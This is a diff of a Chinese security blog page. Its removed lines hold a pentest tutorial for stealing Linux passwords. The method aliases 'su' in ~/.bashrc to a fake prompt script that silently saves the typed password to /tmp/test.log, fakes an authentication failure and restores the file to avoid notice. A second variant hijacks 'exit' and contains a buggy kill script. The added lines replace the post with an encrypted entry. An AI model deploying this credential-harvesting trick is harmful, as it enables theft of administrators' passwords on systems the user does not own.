@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Linux利用别名抓取账户切换时密码 | Knsec         |       低调求发展 - 潜心习安全</title>
-  <meta name="keywords" content=" Linux , 渗透技巧 ">
-  <meta name="description" content="Linux利用别名抓取账户切换时密码 | Knsec         |       低调求发展 - 潜心习安全">
+  <title>hunter信息收集 | Knsec         |       低调求发展 - 潜心习安全</title>
+  <meta name="keywords" content=" 密码 ">
+  <meta name="description" content="hunter信息收集 | Knsec         |       低调求发展 - 潜心习安全">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="有东西被加密了, 请输入密码查看.">
 <meta property="og:type" content="article">
@@ -393,9 +393,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Linux利用别名抓取账户切换时密码" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-hunter信息收集" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Linux利用别名抓取账户切换时密码</h1>
+        <h1 class="article-title">hunter信息收集</h1>
     
     <div class="article-meta">
         
@@ -405,7 +405,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="手法技巧">手法技巧</a>
+            <a  data-rel="未公开工具">未公开工具</a>
             
         </span>
         
@@ -413,21 +413,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color1">Linux</a>
-            
-            <a class="color5">渗透技巧</a>
+            <a class="color3">密码</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2020-07-17 18:14:26'>2020-07-09 20:08</time>
+            发布时间 : <time class="date" title='最后更新: 2020-07-17 20:40:26'>2020-07-17 20:30</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:838</span>
+        <span>字数:15</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -446,7 +444,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#实现思路"><span class="toc-text">实现思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#具体实现（方法1）"><span class="toc-text">具体实现（方法1）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法2"><span class="toc-text">方法2</span></a></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -462,124 +460,15 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h3><blockquote>
-<p>在Linux系统下，有个 <strong>~/.bashrc文件</strong></p>
-</blockquote>
-<pre><code class="bash"># .bashrc
-
-# User specific aliases and functions
-
-alias rm=&#39;rm -i&#39;
-alias cp=&#39;cp -i&#39;
-alias mv=&#39;mv -i&#39;
-alias ll=&#39;ls -all&#39;    # 这是我刚刚添加的，
-# Source global definitions
-if [ -f /etc/bashrc ]; then
-        . /etc/bashrc
-fi</code></pre>
-<pre><code class="bash">source ~/.bashrc   # 重启环境变量之后别名才能生效，或直接注销当前账户也行</code></pre>
-<blockquote>
-<p>此时在终端输入 ‘ll’ 相当于输入ls -all</p>
-</blockquote>
-<pre><code class="bash">[root@localhost ~]# ll
-总用量 36
-dr-xr-x---.  2 root root  175 7月   9 09:03 .
-dr-xr-xr-x. 17 root root  224 7月   9 2020 ..
--rw-------.  1 root root 1399 7月   9 2020 anaconda-ks.cfg
--rw-------.  1 root root  421 7月   9 09:03 .bash_history
--rw-r--r--.  1 root root   18 12月 28 2013 .bash_logout
--rw-r--r--.  1 root root  176 12月 28 2013 .bash_profile
--rw-r--r--.  1 root root  194 7月   9 09:03 .bashrc
--rw-r--r--.  1 root root  100 12月 28 2013 .cshrc
--rw-r--r--.  1 root root  129 12月 28 2013 .tcshrc
--rw-------.  1 root root  639 7月   9 09:03 .viminfo
-</code></pre>
-<p><strong>输入ll的时候相当于ls -all ，在渗透测试时拿到低权限用户，不考虑提权，可以对此用户进行一个账户密码抓取</strong></p>
-<h3 id="具体实现（方法1）"><a href="#具体实现（方法1）" class="headerlink" title="具体实现（方法1）"></a>具体实现（方法1）</h3><blockquote>
-<p>看一下当低权限用户使用su 切换用户时，正常的信息显示</p>
-</blockquote>
-<pre><code class="bash">[Knsec@localhost ~]$ su - root
-Password: 
-su: Authentication failure
-[Knsec@localhost ~]$ </code></pre>
-<blockquote>
-<p>编写shell脚本，并把抓到的密码存到想存的地方</p>
-</blockquote>
-<pre><code class="bash">#!/bin/bash
-echo -e &quot;Password: \c&quot;  # \c 为不换行
-read -s pass
-echo $pass &gt;&gt; /tmp/test.log
-echo &quot;&quot;
-echo &quot;su: Authentication failure&quot;</code></pre>
-<pre><code class="bash">chmod 755 1.sh    # 添加权限</code></pre>
-<p><img src="/../images/image-20200709211848965.png" alt="image-20200709211848965"></p>
-<p>嗯。。。 有点这个意思了</p>
-<p>利用上面说到的别名进行修改。<strong>记得重启环境变量</strong></p>
-<p><img src="/../images/image-20200709212233643.png" alt="image-20200709212233643"></p>
-<pre><code class="bash">source ~/.bashrc</code></pre>
-<p><img src="/../images/image-20200709212421145.png" alt="image-20200709212421145"></p>
-<p>但是这样管理员会一直无法认证成功，最后导致暴露。在脚本原有的基础上添加</p>
-<pre><code class="bash">#!/bin/bash
-echo -e &quot;Password: \c&quot;  # \c 为不换行
-read -s pass
-echo $pass &gt;&gt; /tmp/test.log
-echo &quot;&quot;
-echo &quot;su: Authentication failure&quot;
-cp -p /tmp/.bashrc .bashrc
-rm /tmp/.bashrc
-source ~/.bashrc</code></pre>
-<blockquote>
-<p>把源文件备份至指定可写目录中</p>
-</blockquote>
-<p>然后运行</p>
-<p><img src="/../images/image-20200709213718232.png" alt="image-20200709213718232"></p>
-<p>失败一次之后，管理员可能会觉得是自己密码打错了，此时我们已经抓了密码。</p>
-<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><blockquote>
-<p>此时存在一个问题，当用户退出时，如果习惯使用exit退出终端，需要输入两边才可能退出</p>
-</blockquote>
-<p><img src="/../images/image-20200709213934721.png" alt="image-20200709213934721"></p>
-<blockquote>
-<p>此时需要分析管理员的习惯，是习惯直接关掉终端还是习惯使用exit退出终端之后再关掉窗口</p>
-</blockquote>
-<p>如果习惯使用exit则使用下面方法</p>
-<p>备份两个源.bashrc文件</p>
-<pre><code class="bash">[Knsec@localhost ~]$ cp -p .bashrc /tmp/.bashrc
-[Knsec@localhost ~]$ cp -p .bashrc /tmp/.bashrc_tmp</code></pre>
-<p>修改.bashrc_tmp</p>
-<pre><code class="bash">alias exit=&#39;./2.sh&#39;</code></pre>
-<p>修改1.sh</p>
-<pre><code class="bash">#!/bin/bash
-echo -e &quot;Password: \c&quot;  # \c 为不换行
-read -s pass
-echo $pass &gt;&gt; /tmp/test.log
-echo &quot;&quot;
-echo &quot;su: Authentication failure&quot;
-cp -p /tmp/.bashrc_tmp .bashrc
-rm /tmp/.bashrc_tmp
-bash</code></pre>
-<p>修改2.sh</p>
-<pre><code class="bash">#!/bin/bash
-#  寻找su恶意脚本并kill掉，实现一次exit就退出
-ps_result=`ps -ef | grep &quot;/bin/bash ./1.sh&quot;` 
-pid=`echo $tmp | awk &#39;{print $3}&#39;`
-cp -p /tmp/.bashrc .bashrc 
-rm /tmp/.bashrc kill -9 $pid</code></pre>
-<p>效果：</p>
-<pre><code class="bash">[Knsec@localhost ~]$ su - root
-Password: 
-su: Authentication failure
-[Knsec@localhost ~]$ su - root
-Password：
-Last login：Thu Jul 9 09:42:40 EDT 2020 on pts/0 
-[root@localhost ~]# exit
-logout
-[Knsec@localhost ~]$ 
-</code></pre>
-<blockquote>
-<p>至此，管理员习惯输入exit退出终端时，执行完恶意脚本，输入一次exit即可退出终端</p>
-<p>如果是管理员习惯直接关掉窗口，则使用方法1</p>
-</blockquote>
-
+        <div id="hexo-blog-encrypt" data-wpm="密码错误，无法查看." data-whm="文章不能被校验, 不过还是能看看解密后的内容.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">此为不公开文章，请输入密码查看.</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="44a4fbc7c4eb23b137ea7deb4a394e6227aeef87ebb4c025a1b3565d9dbbb9a2">957b6b461960c0a311a082a77f9c2ea790434c2a9b4931abef077e668e026b975b04ceccc334fe52b9545967a3e72c7eeefacf8026746666c9d1ddfef2b92245329b3835e385406479ad3958a5280230b19cebcfeffe54cfdab964e96142808a9a698d869c4ad5d7f59910dee1356efb5b26c9e4952ffbe05be5609d5921522e1e4cd1c0c129be5c5f151ec128bbdbe6775cf27c00b5efc1c81cf9e52f97bcb4242bbea89e410ab258a4e9b15065afadc71b7e2e1d5de02925be12b1fa7a28fb33a30bf9fe74d1a7612ec9ee2ca7ee9939cc562ef1b9ff0c0ba74d83e34b91adf73023eab50b16cb78e02aac61c31c262c153fe4189d7968bd9a2a2b085c3931ec8dca49e16878bc9cb7d7428f7366d595ca92383c1698fe3484facc97db6b4d448356455ef83b1a944ff1a6cce6b5a16da4039417df569219033053429ac08f804f105d5fd40c451b609ce374dfccda6e66eae34a7075eeb7c18a9620544b712ca0dc15f0b806a4507da08b8d6584f3109f05797cc684e3ed0f5cf65043114327415a7fc8d64536f16aea38db6385435a0aa1248d84b7a927a0611afca601112c1878e8a2e67ccb3e77c3dfcb322386431545ad6f512e681d948bec0aceaa328e1e6f7239c8c8b9b361dc181879dcd402aa760f2bfdb38cce504e8d8efb369f34cf943793dadadd74db43563985f3670abef4ac6829e394af07d479260d9ec8e313fdf6bfc7c4c6e6a0dcd10eaa42e5ff46260d800705b29954e275b533c557a2bc46ddf3ca81613f48f1839abc8d6d6fac231bad8925a1cd78beb1e2ff367287384e4a955cf3794ad5d34327258c31c59dd154c5fb567a4a695ca32937f43f017eebb21e76f21a90bc11bfd276d4680ac996fb4b946b136786fe5fa9a2a1b94fed9d218903fcfe9905fdc73a24f9da87cf625d79a647d0c10c6cb961cb4064c7bbba10b110a6366342015bd75817dca1835bac97117172949632065d0c14865e61447903cd1e24c914c677007f1ea8188bb1675de900bae04e28800bc0760a0c18f51866dc19987c8219d7d6766cefbbc1e5f95dc9b691eec6edc7e0efe1849ff083e2c1fa6e7ce929b0467251821c06612715c49eee52c4d8ff125f11d92b87d49782bb9eeab160043cd6714b603dc656f577d01affa42b080994fbdddbcd4ed5168be877a3aceacf73c3869e3617f0a39253ab5f2428a4b20f5ae8f3141ac24b4d5a7c8e0fc5cc1c4cf07852220171eb14ac7e2bfe8923464fd216b644e256dccc8ca4193e70f43e2efd8cf50aa554fc4772e9ba362e9ed4b0851e45e450032899b4d3dd84d0f82bec97b33cc47b972e135034056626ede09310c6949aa2ab00198e1bef778a006bcd00b521cd2ccd98e1bc98a432335ca159785a248af86b4f72c27cb6c98f4c44cd7a354cd46dfe1619321fe2e9b562156369e5e8664deed6ec9e4fcdac749b572f844b1a0b26f68bf97e267ef2d7a3c777c8342bfaa2</script>
+</div>
+<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">
       
        
     </div>
